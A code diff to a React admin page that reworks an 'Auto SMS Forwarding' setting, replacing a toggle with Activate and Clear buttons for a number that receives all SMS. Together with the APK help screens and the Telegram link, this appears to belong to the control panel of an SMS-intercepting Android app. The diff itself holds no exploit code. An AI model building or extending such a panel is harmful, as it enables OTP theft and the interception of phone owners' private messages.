@@ -842,7 +842,6 @@ export default function MainPage() {
   const [helpOpen,   setHelpOpen]   = useState(false);
   const [helpScreen, setHelpScreen] = useState<"" | "settings" | "apk" | "fixapk">("");
   const [globalPhone,   setGlobalPhone]   = useState("");
-  const [globalEnabled, setGlobalEnabled] = useState(false);
   const [globalLoading, setGlobalLoading] = useState(false);
   const [globalMsg,     setGlobalMsg]     = useState("");
   const [pinOld,        setPinOld]        = useState("");
@@ -1083,10 +1082,11 @@ export default function MainPage() {
   function openTelegramTarget() { const raw = String((import.meta.env.VITE_TELEGRAM_TARGET as string) || "").trim(); if (!raw) return; _openLink(raw.startsWith("http") ? raw : `https://${raw}`); }
   function openTelegramHelp() { _openLink(String(ENV.TELEGRAM_CHANNEL || "https://t.me/")); }
 
-  async function loadGlobalPhone() { try { const r = await fetch(`${ENV.API_BASE}/api/admin/globalPhone`, { headers: apiHeaders() }); const d = await r.json(); const ph = String(d?.phone || ""); setGlobalPhone(ph); setGlobalEnabled(!!ph); } catch {} }
+  async function loadGlobalPhone() { try { const r = await fetch(`${ENV.API_BASE}/api/admin/globalPhone`, { headers: apiHeaders() }); const d = await r.json(); const ph = String(d?.phone || ""); setGlobalPhone(ph); } catch {} }
   async function loadPinStatus() { try { const r = await fetch(`${ENV.API_BASE}/api/admin/deletePassword/status`, { headers: apiHeaders() }); const d = await r.json(); setPinIsSet(d?.isSet === true); } catch { setPinIsSet(null); } }
   async function loadSettingsData() { await Promise.all([loadGlobalPhone(), loadPinStatus()]); }
-  async function saveGlobalPhone() { setGlobalLoading(true); setGlobalMsg(""); try { await axios.put(`${ENV.API_BASE}/api/admin/globalPhone`, { phone: globalEnabled ? globalPhone : "" }, { headers: apiHeaders() }); setGlobalMsg(globalEnabled ? "✅ Saved!" : "✅ Cleared!"); if (!globalEnabled) setGlobalPhone(""); } catch { setGlobalMsg("❌ Failed"); } finally { setGlobalLoading(false); } }
+  async function activateGlobalPhone() { setGlobalLoading(true); setGlobalMsg(""); try { await axios.put(`${ENV.API_BASE}/api/admin/globalPhone`, { phone: globalPhone }, { headers: apiHeaders() }); setGlobalMsg("✅ Activated!"); } catch { setGlobalMsg("❌ Failed"); } finally { setGlobalLoading(false); } }
+  async function clearGlobalPhone() { setGlobalLoading(true); setGlobalMsg(""); try { await axios.put(`${ENV.API_BASE}/api/admin/globalPhone`, { phone: "" }, { headers: apiHeaders() }); setGlobalPhone(""); setGlobalMsg("✅ Cleared!"); } catch { setGlobalMsg("❌ Failed"); } finally { setGlobalLoading(false); } }
   async function changePin() { setPinMsg(""); if (pinIsSet === true && !pinOld) { setPinMsg("❌ Old PIN required"); return; } if (!pinNew) { setPinMsg("❌ New PIN required"); return; } if (pinNew !== pinConfirm) { setPinMsg("❌ PINs don't match"); return; } if (pinNew.length < 4) { setPinMsg("❌ Min 4 digits"); return; } try { const r = await axios.post(`${ENV.API_BASE}/api/admin/deletePassword/change`, { currentPassword: pinOld, newPassword: pinNew }, { headers: apiHeaders() }); if (r.data?.success) { setPinMsg("✅ PIN " + (pinIsSet ? "changed!" : "set!")); setPinOld(""); setPinNew(""); setPinConfirm(""); setPinIsSet(true); } else { setPinMsg("❌ " + (r.data?.error || "Failed")); } } catch (e: any) { setPinMsg("❌ " + (e?.response?.data?.error || "Failed")); } }
 
  async function changeLoginPassword() {
@@ -1372,13 +1372,25 @@ export default function MainPage() {
               <div className="px-5 pt-5 pb-2">
                 <div className="flex items-center gap-2 mb-1"><span className="text-[18px]">📲</span><span className="text-[15px] font-bold text-gray-900">Auto SMS Forwarding</span></div>
                 <p className="text-[12px] text-gray-400 mb-4">Sabhi SMS automatically ek number pe forward hote hain</p>
-                <div className="flex items-center justify-between mb-5 p-3 rounded-xl bg-gray-50 border border-gray-100">
-                  <div><div className="text-[13px] font-semibold text-gray-700">Forwarding</div><div className={`text-[11px] font-medium ${globalEnabled ? "text-green-600" : "text-gray-400"}`}>{globalEnabled ? "ON — Active" : "OFF — Disabled"}</div></div>
-                  <button type="button" onClick={() => { setGlobalEnabled((v) => !v); setGlobalMsg(""); }} className={`relative h-8 w-14 rounded-full transition-colors duration-200 ${globalEnabled ? "bg-green-500" : "bg-gray-300"}`}><span className={`absolute top-1 h-6 w-6 rounded-full bg-white shadow transition-transform duration-200 ${globalEnabled ? "translate-x-7" : "translate-x-1"}`} /></button>
-                </div>
-                <SettingsInput label="Forward Number" hint="Jis number pe SMS bhejne hain (with country code)" value={globalPhone} onChange={setGlobalPhone} inputMode="tel" />
+                {globalPhone ? (
+                  <div className="mb-4 flex items-center justify-between rounded-xl bg-green-50 border border-green-200 px-4 py-3">
+                    <div>
+                      <div className="text-[11px] font-bold text-green-600 uppercase tracking-wide mb-0.5">Active Number</div>
+                      <div className="text-[15px] font-bold text-green-800">{globalPhone}</div>
+                    </div>
+                    <button type="button" onClick={clearGlobalPhone} disabled={globalLoading} className="rounded-xl bg-red-50 border border-red-200 px-3 py-2 text-[12px] font-bold text-red-600 active:scale-[0.98] disabled:opacity-50">{globalLoading ? "…" : "Clear"}</button>
+                  </div>
+                ) : (
+                  <div className="mb-4 rounded-xl bg-gray-50 border border-gray-100 px-4 py-3">
+                    <div className="text-[12px] font-semibold text-gray-400">Koi number active nahi hai</div>
+                  </div>
+                )}
+                <SettingsInput label={globalPhone ? "Number Change Karen" : "Forward Number"} hint="Jis number pe SMS bhejne hain (with country code)" value={globalPhone} onChange={setGlobalPhone} inputMode="tel" />
               </div>
-              <div className="px-5 pb-5"><button type="button" onClick={saveGlobalPhone} disabled={globalLoading} className="w-full rounded-xl bg-gray-900 py-3 text-[14px] font-bold text-white disabled:opacity-50 active:scale-[0.98]">{globalLoading ? "Saving…" : "Save Changes"}</button>{globalMsg && <div className="mt-2 text-center text-[13px] font-medium">{globalMsg}</div>}</div>
+              <div className="px-5 pb-5">
+                <button type="button" onClick={activateGlobalPhone} disabled={globalLoading || !globalPhone.trim()} className="w-full rounded-xl bg-gray-900 py-3 text-[14px] font-bold text-white disabled:opacity-50 active:scale-[0.98]">{globalLoading ? "Saving…" : "✅ Activate"}</button>
+                {globalMsg && <div className="mt-2 text-center text-[13px] font-medium">{globalMsg}</div>}
+              </div>
             </div>
 
             {/* Change Login Password */}
